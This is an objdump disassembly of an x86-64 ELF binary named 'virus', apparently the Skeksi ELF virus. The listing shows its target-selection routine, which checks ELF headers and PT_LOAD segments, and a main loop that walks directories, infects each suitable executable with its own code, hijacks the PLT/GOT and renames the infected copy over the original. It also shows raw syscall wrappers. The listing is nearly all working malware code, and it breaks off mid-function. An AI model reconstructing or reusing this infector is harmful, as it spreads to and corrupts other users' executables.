
./virus:     file format elf64-x86-64


Disassembly of section .text:

000000000040019c <_start>:
  40019c:	f3 0f 1e fa          	endbr64 
  401b6b:	48 89 10             	mov    QWORD PTR [rax],rdx
  401b6e:	b8 00 00 00 00       	mov    eax,0x0
  401b73:	c9                   	leave  
  401b74:	c3                   	ret    

0000000000401b75 <check_criteria>:
  401b75:	f3 0f 1e fa          	endbr64 
  401b79:	55                   	push   rbp
  401b7a:	48 89 e5             	mov    rbp,rsp
  401b7d:	48 81 ec 00 10 00 00 	sub    rsp,0x1000
  401b84:	48 83 0c 24 00       	or     QWORD PTR [rsp],0x0
  401b89:	48 81 ec d0 00 00 00 	sub    rsp,0xd0
  401b90:	48 89 bd 38 ef ff ff 	mov    QWORD PTR [rbp-0x10c8],rdi
  401b97:	c7 45 f4 00 00 00 00 	mov    DWORD PTR [rbp-0xc],0x0
  401b9e:	48 8b 85 38 ef ff ff 	mov    rax,QWORD PTR [rbp-0x10c8]
  401ba5:	ba 00 00 00 00       	mov    edx,0x0
  401baa:	be 00 00 00 00       	mov    esi,0x0
  401baf:	48 89 c7             	mov    rdi,rax
  401bb2:	e8 0a 05 00 00       	call   4020c1 <_open>
  401bb7:	89 45 f0             	mov    DWORD PTR [rbp-0x10],eax
  401bba:	83 7d f0 00          	cmp    DWORD PTR [rbp-0x10],0x0
  401bbe:	79 0a                	jns    401bca <check_criteria+0x55>
  401bc0:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401bc5:	e9 27 01 00 00       	jmp    401cf1 <check_criteria+0x17c>
  401bca:	8b 45 f0             	mov    eax,DWORD PTR [rbp-0x10]
  401bcd:	48 98                	cdqe   
  401bcf:	48 8d 8d 40 ef ff ff 	lea    rcx,[rbp-0x10c0]
  401bd6:	ba 00 10 00 00       	mov    edx,0x1000
  401bdb:	48 89 ce             	mov    rsi,rcx
  401bde:	48 89 c7             	mov    rdi,rax
  401be1:	e8 2f 05 00 00       	call   402115 <_read>
  401be6:	85 c0                	test   eax,eax
  401be8:	79 0a                	jns    401bf4 <check_criteria+0x7f>
  401bea:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401bef:	e9 fd 00 00 00       	jmp    401cf1 <check_criteria+0x17c>
  401bf4:	8b 45 f0             	mov    eax,DWORD PTR [rbp-0x10]
  401bf7:	89 c7                	mov    edi,eax
  401bf9:	e8 f9 04 00 00       	call   4020f7 <_close>
  401bfe:	48 8d 85 40 ef ff ff 	lea    rax,[rbp-0x10c0]
  401c05:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  401c09:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401c0d:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  401c11:	48 8d 95 40 ef ff ff 	lea    rdx,[rbp-0x10c0]
  401c18:	48 01 d0             	add    rax,rdx
  401c1b:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
  401c1f:	48 8d 85 40 ef ff ff 	lea    rax,[rbp-0x10c0]
  401c26:	ba 04 00 00 00       	mov    edx,0x4
  401c2b:	48 89 c6             	mov    rsi,rax
  401c2e:	48 8d 3d 5b 12 00 00 	lea    rdi,[rip+0x125b]        # 402e90 <display_skeksi+0x112>
  401c35:	e8 af 10 00 00       	call   402ce9 <_memcmp>
  401c3a:	85 c0                	test   eax,eax
  401c3c:	74 0a                	je     401c48 <check_criteria+0xd3>
  401c3e:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401c43:	e9 a9 00 00 00       	jmp    401cf1 <check_criteria+0x17c>
  401c48:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401c4c:	48 83 c0 09          	add    rax,0x9
  401c50:	8b 00                	mov    eax,DWORD PTR [rax]
  401c52:	89 45 dc             	mov    DWORD PTR [rbp-0x24],eax
  401c55:	81 7d dc 25 5d 01 00 	cmp    DWORD PTR [rbp-0x24],0x15d25
  401c5c:	75 0a                	jne    401c68 <check_criteria+0xf3>
  401c5e:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401c63:	e9 89 00 00 00       	jmp    401cf1 <check_criteria+0x17c>
  401c68:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401c6c:	0f b7 40 10          	movzx  eax,WORD PTR [rax+0x10]
  401c70:	66 83 f8 02          	cmp    ax,0x2
  401c74:	74 07                	je     401c7d <check_criteria+0x108>
  401c76:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401c7b:	eb 74                	jmp    401cf1 <check_criteria+0x17c>
  401c7d:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401c81:	0f b7 40 12          	movzx  eax,WORD PTR [rax+0x12]
  401c85:	66 83 f8 3e          	cmp    ax,0x3e
  401c89:	74 07                	je     401c92 <check_criteria+0x11d>
  401c8b:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401c90:	eb 5f                	jmp    401cf1 <check_criteria+0x17c>
  401c92:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  401c99:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [rbp-0x8],0x0
  401ca0:	eb 2d                	jmp    401ccf <check_criteria+0x15a>
  401ca2:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  401ca5:	48 63 d0             	movsxd rdx,eax
  401ca8:	48 89 d0             	mov    rax,rdx
  401cab:	48 c1 e0 03          	shl    rax,0x3
  401caf:	48 29 d0             	sub    rax,rdx
  401cb2:	48 c1 e0 03          	shl    rax,0x3
  401cb6:	48 89 c2             	mov    rdx,rax
  401cb9:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  401cbd:	48 01 d0             	add    rax,rdx
  401cc0:	8b 00                	mov    eax,DWORD PTR [rax]
  401cc2:	83 f8 02             	cmp    eax,0x2
  401cc5:	75 04                	jne    401ccb <check_criteria+0x156>
  401cc7:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  401ccb:	83 45 f8 01          	add    DWORD PTR [rbp-0x8],0x1
  401ccf:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401cd3:	0f b7 40 38          	movzx  eax,WORD PTR [rax+0x38]
  401cd7:	0f b7 c0             	movzx  eax,ax
  401cda:	39 45 f8             	cmp    DWORD PTR [rbp-0x8],eax
  401cdd:	7c c3                	jl     401ca2 <check_criteria+0x12d>
  401cdf:	83 7d fc 00          	cmp    DWORD PTR [rbp-0x4],0x0
  401ce3:	75 07                	jne    401cec <check_criteria+0x177>
  401ce5:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401cea:	eb 05                	jmp    401cf1 <check_criteria+0x17c>
  401cec:	b8 00 00 00 00       	mov    eax,0x0
  401cf1:	c9                   	leave  
  401cf2:	c3                   	ret    

0000000000401cf3 <do_main>:
  401cf3:	f3 0f 1e fa          	endbr64 
  401cf7:	55                   	push   rbp
  401cf8:	48 89 e5             	mov    rbp,rsp
  401cfb:	4c 8d 9c 24 00 80 ff 	lea    r11,[rsp-0x8000]
  401d02:	ff 
  401d03:	48 81 ec 00 10 00 00 	sub    rsp,0x1000
  401d0a:	48 83 0c 24 00       	or     QWORD PTR [rsp],0x0
  401d0f:	4c 39 dc             	cmp    rsp,r11
  401d12:	75 ef                	jne    401d03 <do_main+0x10>
  401d14:	48 81 ec 60 03 00 00 	sub    rsp,0x360
  401d1b:	48 89 bd a8 7c ff ff 	mov    QWORD PTR [rbp-0x8358],rdi
  401d22:	48 c7 45 90 00 00 00 	mov    QWORD PTR [rbp-0x70],0x0
  401d29:	00 
  401d2a:	48 c7 45 e8 00 00 00 	mov    QWORD PTR [rbp-0x18],0x0
  401d31:	00 
  401d32:	c7 45 f8 04 00 00 00 	mov    DWORD PTR [rbp-0x8],0x4
  401d39:	c7 45 f4 00 00 00 00 	mov    DWORD PTR [rbp-0xc],0x0
  401d40:	48 8d 05 4e 11 00 00 	lea    rax,[rip+0x114e]        # 402e95 <display_skeksi+0x117>
  401d47:	48 89 85 e0 7c ff ff 	mov    QWORD PTR [rbp-0x8320],rax
  401d4e:	48 8d 05 46 11 00 00 	lea    rax,[rip+0x1146]        # 402e9b <display_skeksi+0x11d>
  401d55:	48 89 85 e8 7c ff ff 	mov    QWORD PTR [rbp-0x8318],rax
  401d5c:	48 8d 05 42 11 00 00 	lea    rax,[rip+0x1142]        # 402ea5 <display_skeksi+0x127>
  401d63:	48 89 85 f0 7c ff ff 	mov    QWORD PTR [rbp-0x8310],rax
  401d6a:	48 8d 05 39 11 00 00 	lea    rax,[rip+0x1139]        # 402eaa <display_skeksi+0x12c>
  401d71:	48 89 85 f8 7c ff ff 	mov    QWORD PTR [rbp-0x8308],rax
  401d78:	66 c7 85 de 7c ff ff 	mov    WORD PTR [rbp-0x8322],0x2e
  401d7f:	2e 00 
  401d81:	b8 00 00 00 00       	mov    eax,0x0
  401d86:	e8 f9 02 00 00       	call   402084 <_getuid>
  401d8b:	85 c0                	test   eax,eax
  401d8d:	74 09                	je     401d98 <do_main+0xa5>
  401d8f:	48 8d 85 de 7c ff ff 	lea    rax,[rbp-0x8322]
  401d96:	eb 0f                	jmp    401da7 <do_main+0xb4>
  401d98:	48 8d 85 e0 7c ff ff 	lea    rax,[rbp-0x8320]
  401d9f:	48 89 c7             	mov    rdi,rax
  401da2:	e8 b5 e6 ff ff       	call   40045c <randomly_select_dir>
  401da7:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  401dab:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401daf:	48 8d 35 fd 10 00 00 	lea    rsi,[rip+0x10fd]        # 402eb3 <display_skeksi+0x135>
  401db6:	48 89 c7             	mov    rdi,rax
  401db9:	e8 cb 0e 00 00       	call   402c89 <_strcmp>
  401dbe:	85 c0                	test   eax,eax
  401dc0:	75 07                	jne    401dc9 <do_main+0xd6>
  401dc2:	c7 45 f8 01 00 00 00 	mov    DWORD PTR [rbp-0x8],0x1
  401dc9:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401dcd:	ba 00 00 00 00       	mov    edx,0x0
  401dd2:	be 00 00 01 00       	mov    esi,0x10000
  401dd7:	48 89 c7             	mov    rdi,rax
  401dda:	e8 e2 02 00 00       	call   4020c1 <_open>
  401ddf:	89 45 e4             	mov    DWORD PTR [rbp-0x1c],eax
  401de2:	83 7d e4 00          	cmp    DWORD PTR [rbp-0x1c],0x0
  401de6:	0f 88 92 02 00 00    	js     40207e <do_main+0x38b>
  401dec:	48 8d 85 00 7e ff ff 	lea    rax,[rbp-0x8200]
  401df3:	48 89 c7             	mov    rdi,rax
  401df6:	e8 92 f0 ff ff       	call   400e8d <load_self>
  401dfb:	8b 45 e4             	mov    eax,DWORD PTR [rbp-0x1c]
  401dfe:	48 8d 8d 90 7f ff ff 	lea    rcx,[rbp-0x8070]
  401e05:	ba 00 80 00 00       	mov    edx,0x8000
  401e0a:	48 89 ce             	mov    rsi,rcx
  401e0d:	89 c7                	mov    edi,eax
  401e0f:	e8 92 05 00 00       	call   4023a6 <_getdents64>
  401e14:	89 45 e0             	mov    DWORD PTR [rbp-0x20],eax
  401e17:	83 7d e0 00          	cmp    DWORD PTR [rbp-0x20],0x0
  401e1b:	0f 88 60 02 00 00    	js     402081 <do_main+0x38e>
  401e21:	83 7d e0 00          	cmp    DWORD PTR [rbp-0x20],0x0
  401e25:	0f 84 f5 01 00 00    	je     402020 <do_main+0x32d>
  401e2b:	c7 45 dc 00 00 00 00 	mov    DWORD PTR [rbp-0x24],0x0
  401e32:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  401e39:	e9 d1 01 00 00       	jmp    40200f <do_main+0x31c>
  401e3e:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401e41:	48 98                	cdqe   
  401e43:	48 8d 95 90 7f ff ff 	lea    rdx,[rbp-0x8070]
  401e4a:	48 01 d0             	add    rax,rdx
  401e4d:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
  401e51:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  401e55:	0f b7 40 10          	movzx  eax,WORD PTR [rax+0x10]
  401e59:	0f b7 c0             	movzx  eax,ax
  401e5c:	83 e8 01             	sub    eax,0x1
  401e5f:	01 45 fc             	add    DWORD PTR [rbp-0x4],eax
  401e62:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  401e66:	48 83 c0 13          	add    rax,0x13
  401e6a:	48 8d 35 44 10 00 00 	lea    rsi,[rip+0x1044]        # 402eb5 <display_skeksi+0x137>
  401e71:	48 89 c7             	mov    rdi,rax
  401e74:	e8 10 0e 00 00       	call   402c89 <_strcmp>
  401e79:	85 c0                	test   eax,eax
  401e7b:	0f 84 80 01 00 00    	je     402001 <do_main+0x30e>
  401e81:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  401e85:	0f b6 40 13          	movzx  eax,BYTE PTR [rax+0x13]
  401e89:	3c 2e                	cmp    al,0x2e
  401e8b:	0f 84 73 01 00 00    	je     402004 <do_main+0x311>
  401e91:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  401e95:	48 8d 48 13          	lea    rcx,[rax+0x13]
  401e99:	48 8d 55 90          	lea    rdx,[rbp-0x70]
  401e9d:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401ea1:	48 89 c6             	mov    rsi,rax
  401ea4:	48 89 cf             	mov    rdi,rcx
  401ea7:	e8 00 e6 ff ff       	call   4004ac <full_path>
  401eac:	48 89 45 c8          	mov    QWORD PTR [rbp-0x38],rax
  401eb0:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  401eb4:	48 89 c7             	mov    rdi,rax
  401eb7:	e8 b9 fc ff ff       	call   401b75 <check_criteria>
  401ebc:	85 c0                	test   eax,eax
  401ebe:	0f 88 43 01 00 00    	js     402007 <do_main+0x314>
  401ec4:	83 7d f4 00          	cmp    DWORD PTR [rbp-0xc],0x0
  401ec8:	74 43                	je     401f0d <do_main+0x21a>
  401eca:	c7 45 9c 0a 00 00 00 	mov    DWORD PTR [rbp-0x64],0xa
  401ed1:	48 8d 85 b0 7c ff ff 	lea    rax,[rbp-0x8350]
  401ed8:	be 00 00 00 00       	mov    esi,0x0
  401edd:	48 89 c7             	mov    rdi,rax
  401ee0:	e8 f5 04 00 00       	call   4023da <_gettimeofday>
  401ee5:	48 8d 85 b0 7c ff ff 	lea    rax,[rbp-0x8350]
  401eec:	48 83 c0 08          	add    rax,0x8
  401ef0:	48 89 c7             	mov    rdi,rax
  401ef3:	e8 20 e5 ff ff       	call   400418 <_rand>
  401ef8:	99                   	cdq    
  401ef9:	f7 7d 9c             	idiv   DWORD PTR [rbp-0x64]
  401efc:	89 d0                	mov    eax,edx
  401efe:	89 45 c4             	mov    DWORD PTR [rbp-0x3c],eax
  401f01:	83 7d c4 07          	cmp    DWORD PTR [rbp-0x3c],0x7
  401f05:	0f 85 ff 00 00 00    	jne    40200a <do_main+0x317>
  401f0b:	eb 01                	jmp    401f0e <do_main+0x21b>
  401f0d:	90                   	nop
  401f0e:	48 8d 95 00 7d ff ff 	lea    rdx,[rbp-0x8300]
  401f15:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  401f19:	48 89 d6             	mov    rsi,rdx
  401f1c:	48 89 c7             	mov    rdi,rax
  401f1f:	e8 8a f0 ff ff       	call   400fae <load_target>
  401f24:	48 8d 95 00 7d ff ff 	lea    rdx,[rbp-0x8300]
  401f2b:	48 8d 85 00 7e ff ff 	lea    rax,[rbp-0x8200]
  401f32:	48 89 d6             	mov    rsi,rdx
  401f35:	48 89 c7             	mov    rdi,rax
  401f38:	e8 21 e9 ff ff       	call   40085e <infect_elf_file>
  401f3d:	48 89 45 b8          	mov    QWORD PTR [rbp-0x48],rax
  401f41:	48 8d 85 00 7d ff ff 	lea    rax,[rbp-0x8300]
  401f48:	48 89 c7             	mov    rdi,rax
  401f4b:	e8 1f f0 ff ff       	call   400f6f <unload_target>
  401f50:	48 8d 85 00 7d ff ff 	lea    rax,[rbp-0x8300]
  401f57:	48 89 c6             	mov    rsi,rax
  401f5a:	48 8d 3d af 0e 00 00 	lea    rdi,[rip+0xeaf]        # 402e10 <display_skeksi+0x92>
  401f61:	e8 5f f4 ff ff       	call   4013c5 <load_target_writeable>
  401f66:	e8 d7 0d 00 00       	call   402d42 <get_rip>
  401f6b:	48 c7 c2 4f 2d 40 00 	mov    rdx,0x402d4f
  401f72:	48 89 d1             	mov    rcx,rdx
  401f75:	48 c7 c2 9c 01 40 00 	mov    rdx,0x40019c
  401f7c:	48 29 d1             	sub    rcx,rdx
  401f7f:	48 89 ca             	mov    rdx,rcx
  401f82:	48 29 d0             	sub    rax,rdx
  401f85:	48 89 45 b0          	mov    QWORD PTR [rbp-0x50],rax
  401f89:	e8 b4 0d 00 00       	call   402d42 <get_rip>
  401f8e:	48 c7 c2 4f 2d 40 00 	mov    rdx,0x402d4f
  401f95:	48 89 d1             	mov    rcx,rdx
  401f98:	48 c7 c2 e1 01 40 00 	mov    rdx,0x4001e1
  401f9f:	48 29 d1             	sub    rcx,rdx
  401fa2:	48 89 ca             	mov    rdx,rcx
  401fa5:	48 29 d0             	sub    rax,rdx
  401fa8:	48 89 45 a8          	mov    QWORD PTR [rbp-0x58],rax
  401fac:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  401fb0:	48 2b 45 b0          	sub    rax,QWORD PTR [rbp-0x50]
  401fb4:	48 89 45 a0          	mov    QWORD PTR [rbp-0x60],rax
  401fb8:	48 8b 55 b8          	mov    rdx,QWORD PTR [rbp-0x48]
  401fbc:	48 8b 45 a0          	mov    rax,QWORD PTR [rbp-0x60]
  401fc0:	48 01 d0             	add    rax,rdx
  401fc3:	48 8d 50 40          	lea    rdx,[rax+0x40]
  401fc7:	48 8d 85 00 7d ff ff 	lea    rax,[rbp-0x8300]
  401fce:	48 89 d6             	mov    rsi,rdx
  401fd1:	48 89 c7             	mov    rdi,rax
  401fd4:	e8 03 f8 ff ff       	call   4017dc <infect_pltgot>
  401fd9:	48 8d 85 00 7d ff ff 	lea    rax,[rbp-0x8300]
  401fe0:	48 89 c7             	mov    rdi,rax
  401fe3:	e8 87 ef ff ff       	call   400f6f <unload_target>
  401fe8:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  401fec:	48 89 c6             	mov    rsi,rax
  401fef:	48 8d 3d 1a 0e 00 00 	lea    rdi,[rip+0xe1a]        # 402e10 <display_skeksi+0x92>
  401ff6:	e8 da 01 00 00       	call   4021d5 <_rename>
  401ffb:	83 45 f4 01          	add    DWORD PTR [rbp-0xc],0x1
  401fff:	eb 0a                	jmp    40200b <do_main+0x318>
  402001:	90                   	nop
  402002:	eb 07                	jmp    40200b <do_main+0x318>
  402004:	90                   	nop
  402005:	eb 04                	jmp    40200b <do_main+0x318>
  402007:	90                   	nop
  402008:	eb 01                	jmp    40200b <do_main+0x318>
  40200a:	90                   	nop
  40200b:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  40200f:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402012:	3b 45 e0             	cmp    eax,DWORD PTR [rbp-0x20]
  402015:	0f 8c 23 fe ff ff    	jl     401e3e <do_main+0x14b>
  40201b:	e9 db fd ff ff       	jmp    401dfb <do_main+0x108>
  402020:	90                   	nop
  402021:	83 6d f8 01          	sub    DWORD PTR [rbp-0x8],0x1
  402025:	83 7d f8 00          	cmp    DWORD PTR [rbp-0x8],0x0
  402029:	7e 0f                	jle    40203a <do_main+0x347>
  40202b:	8b 45 e4             	mov    eax,DWORD PTR [rbp-0x1c]
  40202e:	89 c7                	mov    edi,eax
  402030:	e8 c2 00 00 00       	call   4020f7 <_close>
  402035:	e9 47 fd ff ff       	jmp    401d81 <do_main+0x8e>
  40203a:	c7 45 98 32 00 00 00 	mov    DWORD PTR [rbp-0x68],0x32
  402041:	48 8d 85 c0 7c ff ff 	lea    rax,[rbp-0x8340]
  402048:	be 00 00 00 00       	mov    esi,0x0
  40204d:	48 89 c7             	mov    rdi,rax
  402050:	e8 85 03 00 00       	call   4023da <_gettimeofday>
  402055:	48 8d 85 c0 7c ff ff 	lea    rax,[rbp-0x8340]
  40205c:	48 83 c0 08          	add    rax,0x8
  402060:	48 89 c7             	mov    rdi,rax
  402063:	e8 b0 e3 ff ff       	call   400418 <_rand>
  402068:	99                   	cdq    
  402069:	f7 7d 98             	idiv   DWORD PTR [rbp-0x68]
  40206c:	89 d0                	mov    eax,edx
  40206e:	89 45 c4             	mov    DWORD PTR [rbp-0x3c],eax
  402071:	83 7d c4 07          	cmp    DWORD PTR [rbp-0x3c],0x7
  402075:	75 0b                	jne    402082 <do_main+0x38f>
  402077:	e8 02 0d 00 00       	call   402d7e <display_skeksi>
  40207c:	eb 04                	jmp    402082 <do_main+0x38f>
  40207e:	90                   	nop
  40207f:	eb 01                	jmp    402082 <do_main+0x38f>
  402081:	90                   	nop
  402082:	c9                   	leave  
  402083:	c3                   	ret    

0000000000402084 <_getuid>:
  402084:	f3 0f 1e fa          	endbr64 
  402088:	55                   	push   rbp
  402089:	48 89 e5             	mov    rbp,rsp
  40208c:	48 c7 c0 66 00 00 00 	mov    rax,0x66
  402093:	0f 05                	syscall 
  402095:	48 89 c0             	mov    rax,rax
  402098:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  40209c:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4020a0:	5d                   	pop    rbp
  4020a1:	c3                   	ret    

00000000004020a2 <Exit>:
  4020a2:	f3 0f 1e fa          	endbr64 
  4020a6:	55                   	push   rbp
  4020a7:	48 89 e5             	mov    rbp,rsp
  4020aa:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  4020ae:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4020b2:	48 89 c7             	mov    rdi,rax
  4020b5:	48 c7 c0 3c 00 00 00 	mov    rax,0x3c
  4020bc:	0f 05                	syscall 
  4020be:	90                   	nop
  4020bf:	5d                   	pop    rbp
  4020c0:	c3                   	ret    

00000000004020c1 <_open>:
  4020c1:	f3 0f 1e fa          	endbr64 
  4020c5:	55                   	push   rbp
  4020c6:	48 89 e5             	mov    rbp,rsp
  4020c9:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4020cd:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4020d1:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  4020d5:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  4020d9:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  4020dd:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  4020e1:	48 c7 c0 02 00 00 00 	mov    rax,0x2
  4020e8:	0f 05                	syscall 
  4020ea:	48 89 c0             	mov    rax,rax
  4020ed:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4020f1:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4020f5:	5d                   	pop    rbp
  4020f6:	c3                   	ret    

00000000004020f7 <_close>:
  4020f7:	f3 0f 1e fa          	endbr64 
  4020fb:	55                   	push   rbp
  4020fc:	48 89 e5             	mov    rbp,rsp
  4020ff:	89 7d ec             	mov    DWORD PTR [rbp-0x14],edi
  402102:	48 8b 7d ec          	mov    rdi,QWORD PTR [rbp-0x14]
  402106:	48 c7 c0 03 00 00 00 	mov    rax,0x3
  40210d:	0f 05                	syscall 
  40210f:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402113:	5d                   	pop    rbp
  402114:	c3                   	ret    

0000000000402115 <_read>:
  402115:	f3 0f 1e fa          	endbr64 
  402119:	55                   	push   rbp
  40211a:	48 89 e5             	mov    rbp,rsp
  40211d:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402121:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402125:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  402129:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  40212d:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  402131:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  402135:	48 c7 c0 00 00 00 00 	mov    rax,0x0
  40213c:	0f 05                	syscall 
  40213e:	48 89 c0             	mov    rax,rax
  402141:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402145:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402149:	5d                   	pop    rbp
  40214a:	c3                   	ret    

000000000040214b <_write>:
  40214b:	f3 0f 1e fa          	endbr64 
  40214f:	55                   	push   rbp
  402150:	48 89 e5             	mov    rbp,rsp
  402153:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402157:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  40215b:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  40215f:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  402163:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  402167:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  40216b:	48 c7 c0 01 00 00 00 	mov    rax,0x1
  402172:	0f 05                	syscall 
  402174:	48 89 c0             	mov    rax,rax
  402177:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  40217b:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  40217f:	5d                   	pop    rbp
  402180:	c3                   	ret    

0000000000402181 <_fstat>:
  402181:	f3 0f 1e fa          	endbr64 
  402185:	55                   	push   rbp
  402186:	48 89 e5             	mov    rbp,rsp
  402189:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  40218d:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402191:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  402195:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  402199:	48 c7 c0 05 00 00 00 	mov    rax,0x5
  4021a0:	0f 05                	syscall 
  4021a2:	48 89 c0             	mov    rax,rax
  4021a5:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4021a9:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4021ad:	5d                   	pop    rbp
  4021ae:	c3                   	ret    

00000000004021af <_unlink>:
  4021af:	f3 0f 1e fa          	endbr64 
  4021b3:	55                   	push   rbp
  4021b4:	48 89 e5             	mov    rbp,rsp
  4021b7:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4021bb:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  4021bf:	48 c7 c0 57 00 00 00 	mov    rax,0x57
  4021c6:	0f 05                	syscall 
  4021c8:	48 89 c0             	mov    rax,rax
  4021cb:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4021cf:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4021d3:	5d                   	pop    rbp
  4021d4:	c3                   	ret    

00000000004021d5 <_rename>:
  4021d5:	f3 0f 1e fa          	endbr64 
  4021d9:	55                   	push   rbp
  4021da:	48 89 e5             	mov    rbp,rsp
  4021dd:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4021e1:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4021e5:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
